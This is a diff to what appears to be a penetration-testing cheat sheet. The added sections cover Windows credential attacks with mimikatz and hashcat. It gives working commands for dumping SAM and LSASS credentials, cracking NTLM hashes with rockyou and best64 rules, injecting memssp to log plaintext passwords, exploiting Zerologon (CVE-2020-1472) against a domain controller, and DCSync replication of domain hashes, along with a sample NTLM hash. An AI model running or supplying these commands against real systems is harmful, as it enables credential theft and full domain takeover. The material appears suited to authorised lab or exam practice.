@@ -1067,6 +1067,7 @@ root@kali:~# mimikatz -h
     `-- mimispool.dll
 ~~~
 
+## Dump SAM(Get local user NTLM hashes)
 
 ~~~ powershell
 PS C:\tools> .\mimikatz.exe
@@ -1106,20 +1107,24 @@ User : nelly
   Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
 ~~~
 
+## Windows NTLM(-m 1000) cracking
+
 ~~~ bash
 hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt.gz -r /usr/share/hashcat/rules/best64.rule
 ~~~
 
+## Dump credentials from LSASS
 
-~~~ bash
+~~~ powershell
 mimikatz # privilege::debug
 Privilege '20' OK
 
 mimikatz # sekurlsa::logonpasswords
 ~~~
 
+## Capture plaintext logon credentials
 
-~~~ bash
+~~~ powershell
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -1127,6 +1132,19 @@ mimikatz # misc::memssp
 Injected =)
 
 PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
+~~~
+
+## Reset DC machine account password via Netlogon(CVE-2020-1472)
+
+~~~ powershell
+mimikatz.exe "lsadump::zerologon /target:192.168.187.97 /account:DC01$" exit
+mimikatz.exe "lsadump::zerologon /target:192.168.187.97 /account:DC01$ /exploit" exit
+~~~
+
+## Replicate AD account hashes
+
+~~~ powershell
+mimikatz # lsadump::dcsync /domain:secura.yzx /dc:dc01 /user:michael /authuser:DC01$ /authdomain:main /authpassword:"" /authntlm
 ~~~
 
 
